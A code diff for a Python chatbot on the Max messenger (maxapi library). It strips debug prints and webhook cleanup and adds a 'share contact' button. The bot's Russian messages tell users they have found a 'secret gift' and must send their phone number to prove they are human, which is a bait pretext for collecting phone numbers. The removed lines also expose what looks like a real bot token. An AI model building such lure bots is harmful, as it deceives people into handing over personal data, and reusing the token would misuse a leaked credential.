@@ -3,47 +3,31 @@ import logging
 import re
 
 from maxapi import Bot, Dispatcher
-from maxapi.types import MessageCreated
-import maxapi.types
-
-print("========== MAXAPI TYPES ==========")
-print([
-    x for x in dir(maxapi.types)
-    if "keyboard" in x.lower()
-    or "button" in x.lower()
-    or "contact" in x.lower()
-])
-print("===================================")
-import maxapi.types
-
-print("КЛАВИАТУРНЫЕ ТИПЫ:")
-print([
-    x for x in dir(maxapi.types)
-    if "keyboard" in x.lower()
-    or "button" in x.lower()
-    or "contact" in x.lower()
-])
+from maxapi.types import (
+    MessageCreated,
+    RequestContactButton,
+    ButtonsPayload,
+)
 
 logging.basicConfig(level=logging.INFO)
 
-TOKEN = "f9LHodD0cOLJZ_QQj9kIYtnBMD3eCbHBwsf0UQWM34VCwzIwHu7wFVCjZ47aEkfWXziwgMn1oScOGgBlLoF5"
+TOKEN = "ВАШ_ТОКЕН"
 
 bot = Bot(TOKEN)
-print([x for x in dir(bot) if "sub" in x.lower() or "web" in x.lower()])
 dp = Dispatcher()
 
 # Пользователи, от которых ждём номер телефона
 waiting_phone = set()
 
+
 def is_phone(phone: str) -> bool:
-    # Убираем всё кроме цифр
     digits = re.sub(r"\D", "", phone)
 
-    # 89999999999
     if len(digits) == 11 and digits.startswith(("7", "8")):
         return True
 
     return False
+
 
 @dp.message_created()
 async def messages(event: MessageCreated):
@@ -67,42 +51,44 @@ async def messages(event: MessageCreated):
 
             await event.message.answer(
                 "❌ Это не похоже на номер телефона.\n\n"
-                "Попробуйте ещё раз."
+                "Нажмите кнопку «📱 Поделиться номером» "
+                "или отправьте номер вручную."
             )
 
         return
 
-    # Первое сообщение пользователя
+    # Запоминаем пользователя
     waiting_phone.add(user.user_id)
 
+    # Создаём кнопку запроса контакта
+    buttons = ButtonsPayload(
+        buttons=[
+            [
+                RequestContactButton(
+                    text="📱 Поделиться номером"
+                )
+            ]
+        ]
+    ).pack()
+
+    # Отправляем сообщение с кнопкой
     await event.message.answer(
-        f"{user.first_name}, здравствуйте! 👋\n\n"
-        "Вы нашли секретный подарок! 🎁\n\n"
-        "Чтобы он стал вашим, бот должен убедиться, "
-        "что вы — реальный человек.\n\n"
-        "Для подтверждения отправьте ваш номер телефона.\n\n"
-        "Например:\n"
-        "89991234567"
+        text=(
+            f"{user.first_name}, здравствуйте! 👋\n\n"
+            "Вы нашли секретный подарок! 🎁\n\n"
+            "Чтобы он стал вашим, бот должен убедиться, "
+            "что вы — реальный человек.\n\n"
+            "Для подтверждения нажмите кнопку ниже "
+            "и поделитесь своим номером телефона.\n\n"
+            "Или можете отправить номер вручную."
+        ),
+        attachments=[buttons]
     )
 
+
 async def main():
-    try:
-        subscriptions = await bot.get_subscriptions()
-        logging.info(f"Найдены подписки: {subscriptions}")
-
-        if subscriptions:
-            await bot.delete_webhook()
-
-        logging.info("Webhook очищен")
-
-    except Exception as e:
-        logging.warning(f"Не удалось удалить подписки: {e}")
-
     await dp.start_polling(bot)
 
-
-if __name__ == "__main__":
-    asyncio.run(main())
 
 if __name__ == "__main__":
     asyncio.run(main())
